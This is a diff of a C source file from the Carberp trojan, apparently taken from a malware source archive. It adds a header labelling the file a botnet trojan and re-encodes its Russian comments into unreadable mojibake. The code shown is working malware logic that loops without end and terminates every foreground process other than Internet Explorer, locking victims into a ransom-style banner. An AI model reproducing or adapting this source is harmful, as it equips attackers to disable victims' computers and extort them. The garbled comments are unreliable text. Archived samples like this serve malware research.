@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <time.h>
 #include <stdio.h>
@@ -28,25 +39,25 @@ void InfitityKillNonIeTopWindowProcesses()
   }
   PP_DPRINTF(L"InfitityKillNonIeTopWindowProcesses: banner started. Start killing top non IE processes.");
 
-  /// Бесконечный цикл поиска и прибивания процессов, которые не IE
+  /// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ IE
   while (true)
   {
-    // Во избежание лишней нагрузки на процессор делаем смену контекста.
+    // пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     Sleep(100);
 
-    // Переключаемся в тот же десктоп, что и основная программа
-    // Если это не сделаем - не сможем увидеть активную программу со 
-    // своего десктопа
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     BannerSwitchToIeDesktop();
 
     DWORD top_wnd_pid = 0;
     HWND  top_wnd = 0;
     
-    // Находим верхнее окно и пид его процесса
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     top_wnd = GetForegroundWindow();
 		GetWindowThreadProcessId(top_wnd, &top_wnd_pid);
 
-    // Не получилось получить pid
+    // пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ pid
     if (top_wnd_pid == 0) continue;
 
     DWORD pids[200];
@@ -55,7 +66,7 @@ void InfitityKillNonIeTopWindowProcesses()
     FilteredEnumProcesses(ProcessFilter_NonIE, pids, ARRAYSIZE(pids), &pid_count);
     for (DWORD i = 0; i < pid_count; i++)
     {
-      // Fixed: Защита от самоубийства (на будущее)
+      // Fixed: пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
       if (top_wnd_pid == pids[i] && top_wnd_pid != GetCurrentProcessId())
       {
         HANDLE hHandle=OpenProcess(PROCESS_TERMINATE, 0, pids[i]);
